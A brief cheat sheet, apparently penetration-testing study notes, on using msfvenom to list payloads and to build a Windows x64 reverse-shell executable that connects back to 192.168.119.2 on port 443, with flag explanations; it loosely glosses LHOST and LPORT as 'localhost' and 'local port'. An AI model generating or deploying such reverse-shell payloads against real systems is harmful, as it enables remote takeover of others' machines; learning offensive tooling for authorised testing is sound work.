# `msfvenom`
```
msfvenom -l payloads --platform windows --arch x64
```
- `-l`: List payloads
- `--platform`: Specify the platform
- `--arch`: Specify architechture
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```
- `-p`: Select the payload
- `LHOST`: Specify the localhost
- `LPORT`: Specify the local port
- `-f`: Set the output format
- `-o`: Specify the output file name
```
msfvenom --list | grep powershell
```
